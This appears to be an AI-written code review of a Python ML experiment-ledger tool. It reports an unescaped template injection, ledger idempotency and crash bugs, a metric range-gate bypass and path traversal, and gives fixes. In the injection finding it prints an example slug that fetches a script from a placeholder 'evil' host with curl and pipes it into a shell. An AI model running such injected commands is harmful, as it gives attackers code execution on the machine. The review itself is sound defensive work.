---
phase: 03-local-experiment-loop-ledger-strategy
reviewed: 2026-07-11T13:10:29Z
depth: standard
files_reviewed: 22
files_reviewed_list:
  - scripts/experiment_meta.py
  - scripts/metric_registry.py
  - scripts/rebuild_ledger.py
  - scripts/record_experiment.py
  - scripts/regen_strategy.py
  - scripts/run_local.py
  - scripts/scaffold_experiment.py
  - scripts/set_metric.py
  - scripts/templates/config.json.tmpl
  - scripts/templates/experiment.py.tmpl
  - scripts/templates/meta.json.tmpl
  - scripts/templates/pyproject.toml.tmpl
  - scripts/templates/strategy.md.tmpl
  - scripts/templates/VERDICT.md.tmpl
  - SKILL.md
  - tests/test_experiment_meta.py
  - tests/test_metric_registry.py
  - tests/test_rebuild_ledger.py
  - tests/test_record_experiment.py
  - tests/test_regen_strategy.py
  - tests/test_resolve_data_dir.py
  - tests/test_run_cv.py
  - tests/test_run_local.py
  - tests/test_scaffold_experiment.py
  - tests/test_set_metric.py
findings:
  critical: 1
  warning: 3
  info: 2
  total: 6
status: issues_found
---

# Phase 3: Code Review Report

**Reviewed:** 2026-07-11T13:10:29Z
**Depth:** standard
**Files Reviewed:** 22 (source + tests)
**Status:** issues_found

## Summary

The local experiment loop is well-structured and the fail-closed validation ladder in
`record_experiment._validate_result` is genuinely strong: it recomputes `mean(fold_scores)`,
rejects NaN/inf, gates on the metric range, and never appends a FAILED run as a success row.
The atomic-write discipline in `rebuild_ledger` and `regen_strategy` (tempfile + `os.replace`)
is correct, and provenance staging is scoped by explicit path (no blanket `git add`). Those
integrity guarantees hold up under adversarial reading.

The core defect is the one the phase brief flagged: the scaffolder renders **config-sourced
values into executed Python via `string.Template.safe_substitute` with no escaping** — a real
code-integrity / injection hole (CR-01). `safe_substitute` does not quote or escape the value;
`competition_slug` (never charset-validated anywhere) and `cv_scheme` land inside Python string
literals in the minted `experiment.py`, which `run_local` then executes. The author clearly knew
to escape untrusted values elsewhere — `scaffold_experiment._json_inner` is used for the
meta.json `idea`/`hypothesis` fields — but the Python template was left unescaped, and the
test suite only exercises escaping on the JSON path (`test_scaffold_experiment.py:87`), never on
the slug→`experiment.py` path.

Secondary findings concern idempotency and fail-clear robustness: the live ledger append is
**not idempotent** (re-recording a SUCCESS duplicates the row, WR-01), `regen_strategy` is the
only ledger reader that **crashes rather than skips** on a corrupt/partial line (WR-02), and the
`"custom"` metric escape hatch lets a run **bypass the range gate even when config declares a
bounded metric** (WR-03).

No structural pre-pass (`<structural_findings>`) was supplied with this review, so all findings
below are narrative.

## Narrative Findings (AI reviewer)

## Critical Issues

### CR-01: Config-sourced values are rendered unescaped into executed Python (injection / code-integrity)

**File:** `scripts/templates/experiment.py.tmpl:36,38` and `scripts/scaffold_experiment.py:148-159` (via `scripts/init_workspace.py:95-102`)

**Issue:**
`_render_text` renders the harness template with `Template(raw).safe_substitute(mapping)`.
`safe_substitute` performs a raw textual replacement — it does **not** quote or escape the
substituted value. The template embeds two config-sourced values inside Python **string
literals**:

```python
SLUG = "$slug"          # experiment.py.tmpl:36
CV_SCHEME = "$cv_scheme" # experiment.py.tmpl:38
```

`slug` comes from `config.get("competition_slug")` (`scaffold_experiment.py:132`) and is
**never charset-validated** — not at `init` (`init_workspace.py:301-313`, `scaffold` stores the
slug verbatim), not at scaffold time. Any slug containing a double-quote, backslash, or newline
breaks out of the string literal. A value such as:

```
t"; import os; os.system("curl http://evil/x|sh"); _="
```

renders to `SLUG = "t"; import os; os.system("curl http://evil/x|sh"); _=""`, which executes as
arbitrary code the moment `run_local.py` shells `uv run python experiment.py`. Even a benign but
malformed slug (a stray `"` from a bad capture or hand-edit) silently produces a `SyntaxError`
in the generated harness, breaking the "kernel-portable by construction" guarantee.

`cv_scheme` (`scaffold_experiment.py:123`) is read straight from `config.json` and rendered the
same way; its enum is enforced only at *write* time by `analyze_data.py --cv-scheme`, and
scaffold does **not** re-validate it against the four allowed values before rendering it into
executable Python. `metric_name` (validated against `REGISTRY`) and `registry_entry`
(`repr(...)`) are handled safely — the fix should bring `slug`/`cv_scheme` up to the same bar.

The inconsistency is telling: the sibling meta template *is* escaped via `_json_inner`
(`scaffold_experiment.py:170-171`), and the test suite only covers that JSON path
(`test_scaffold_experiment.py:87`) — the slug→`experiment.py` injection is entirely untested.

**Fix:** Render the values as *properly quoted Python literals* rather than interpolating raw
text inside hand-written quotes. Emit them the same way `registry_entry` is emitted, e.g. change
the template to bare placeholders and pass `repr()`-ed values:

```python
# experiment.py.tmpl
SLUG = $slug_literal
CV_SCHEME = $cv_scheme_literal
```
```python
# scaffold_experiment.py
experiment_src = _render_text("experiment.py.tmpl", {
    ...
    "slug_literal": repr(slug),
    "cv_scheme_literal": repr(cv_scheme),
    "registry_entry": repr(registry_entry),
})
```
Additionally (defense-in-depth), validate `slug` against `^[a-z0-9][a-z0-9-]*$` at `init` and
re-check `cv_scheme in {"KFold","StratifiedKFold","GroupKFold","TimeSeriesSplit"}` in
`scaffold_experiment` before rendering — block, don't render, on a mismatch. Add a regression
test that scaffolds with a slug containing `";import os` and asserts the generated file both
imports cleanly and defines `SLUG` as the literal string.

## Warnings

### WR-01: Ledger append is not idempotent — re-recording a SUCCESS duplicates the row

**File:** `scripts/record_experiment.py:346-352`

**Issue:**
On the SUCCESS path the recorder appends a row with `ledger_path.open("a")`. Nothing keys the
append on `exp_id` or checks whether a row already exists. Re-running `record_experiment.py` on
an already-recorded SUCCESS experiment (a legitimate operation — the stub read at line 249 now
resolves to the *canonical* meta, which still carries `exp_id`/`idea`, so classification
re-runs and reaches SUCCESS again) appends a **second identical row**. `regen_strategy` then
lists the experiment twice in the tried-list digest and double-counts it when picking the
current best. This contradicts the D-02 "separate idempotent entry points" claim asserted in the
module docstring. No test re-runs record on the same SUCCESS exp to catch this
(`test_record_experiment.py` only asserts `len(rows) == 1` after a single record).

**Fix:** Make the append idempotent. Simplest robust option: after writing `meta.json`, rebuild
the incremental row set by de-duplicating on `exp_id` (drop any prior line for the same
`exp_id`, then append) — or, since the ledger is already declared a pure function of the meta
folders, drop the incremental append entirely and call the `rebuild_ledger` row-derivation to
rewrite `ledger.jsonl` atomically on every record. At minimum, add a test that records the same
SUCCESS twice and asserts exactly one ledger row.

### WR-02: `regen_strategy._read_ledger` crashes on a corrupt or non-object ledger line

**File:** `scripts/regen_strategy.py:58-63`

**Issue:**
`_read_ledger` does `rows.append(json.loads(line))` with no exception handling. Every other
ledger/meta reader in the phase is fail-clear (`rebuild_ledger._rows_from_folders` skips-and-warns
on `JSONDecodeError`; `record_experiment._read_json` returns an error tuple), but `regen_strategy`
lets a single malformed line raise an uncaught `JSONDecodeError` and abort strategy regeneration
with a raw traceback. It also assumes each parsed line is a dict — a line that parses to a scalar
or list (e.g. `5`) later hits `r.get("status")` in `_current_best_body`/`_tried_list_body` and
raises `AttributeError`. This is reachable in practice: the append in WR-01 is **not atomic**, so
a crash mid-append can leave a truncated final line, after which *every* `regen_strategy` run
crashes until the file is hand-repaired or `rebuild_ledger` is run.

**Fix:** Match the rebuilder's posture — wrap the parse, skip-and-warn on failure, and skip
non-dict rows:

```python
try:
    row = json.loads(line)
except json.JSONDecodeError as exc:
    print(f"regen: skipping unparseable ledger line: {exc}.", file=sys.stderr)
    continue
if not isinstance(row, dict):
    print("regen: skipping non-object ledger line.", file=sys.stderr)
    continue
rows.append(row)
```

### WR-03: `"custom"` metric bypasses the range gate even when config declares a bounded metric

**File:** `scripts/record_experiment.py:142,146-151`

**Issue:**
The metric-match gate accepts a result whose `metric` is either the config metric or the literal
`"custom"`:

```python
if result_metric != metric_name and result_metric != "custom":
    return "schema_invalid"
...
range_entry = REGISTRY.get(result_metric, REGISTRY[metric_name])  # REGISTRY["custom"].range == (-inf, inf)
```

`"custom"` is accepted **regardless of what config declares**. Because `experiment.py` sets
`result["metric"] = "custom"` whenever a callable is passed to `run_cv` (template line 144), an
experiment configured for a bounded metric (e.g. `roc_auc`, range `[0,1]`) can report a score of
`5.0` or `-3.0` as `"custom"` and sail through the range gate as SUCCESS — the exact "implausible
number" case the ladder exists to catch. The escape hatch should only be honored when config
itself declared `custom`.

**Fix:** Only accept `"custom"` when the configured metric is `custom`:

```python
allow_custom = metric_name == "custom"
if result_metric != metric_name and not (allow_custom and result_metric == "custom"):
    return "schema_invalid"
```
When config names a known bounded metric, require the result to report that same metric, so its
registered range is actually enforced.

## Info

### IN-01: `--exp-dir` is not constrained to the workspace (path traversal)

**File:** `scripts/run_local.py:88-89`, `scripts/record_experiment.py:229-230`

**Issue:** `exp_dir = (ws / exp_rel).resolve()` accepts any relative path; `exp_rel = "../../.."`
escapes the workspace. In this loop `--exp-dir` is supplied by the SKILL/loop rather than an
external attacker, so the practical risk is low, but there is no containment check and the value
is also passed into a subprocess argv (`run_local.py:116`). Defense-in-depth for a tool whose
premise is machine-driven, unattended cycles.

**Fix:** After resolving, assert `exp_dir` is inside `ws` (e.g. `ws in exp_dir.parents`) and that
it matches the expected `experiments/exp-NNN` shape; block with a clear message otherwise.

### IN-02: Recorded `artifacts` / `oof_path` from `result.json` are trusted verbatim

**File:** `scripts/record_experiment.py:329`

**Issue:** `meta["artifacts"] = valid_result.get("artifacts", [])` copies experiment-authored
paths into the canonical meta with no check that they exist or stay within the experiment dir.
These are recorded strings (not executed), so impact is limited to a misleading provenance
record, but the recorder validates every *numeric* field while accepting artifact paths blindly.

**Fix:** Optionally validate that each artifact path is relative, stays under `exp_dir`, and
exists on disk before recording it; drop or flag entries that do not.

---

_Reviewed: 2026-07-11T13:10:29Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
